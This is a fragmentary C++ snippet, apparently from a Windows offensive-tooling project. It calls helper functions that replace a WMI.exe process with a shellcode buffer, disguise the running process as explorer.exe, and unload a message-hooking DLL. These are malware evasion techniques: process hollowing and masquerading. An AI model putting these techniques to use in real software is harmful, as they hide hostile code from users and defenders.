...
void main2()
{
	if (FALSE == DLLUtils::ReplaceProcess((PathHelper::GetModuleFolder() + L"WMI.exe").c_str(), Shellcode, 624, 432))
	{
	...
	if (!DLLUtils::DisguiseProcess(GetCurrentProcessId(), L"explore.exe", L"C:\\Windows\\explorer.exe"))
	{
		printf("DisguiseProcess Error %d \n", GetLastError());
	}
	else
	{
		printf("DisguiseProcess Sec %d \n", GetLastError());
	}
...
{
	DLLUtils::FreeAllDLL(_T("D:\\Space\\System\\Windows\\DLLProject\\HookMessage\\x64\\Debug\\HookWTSSend.dll"));
}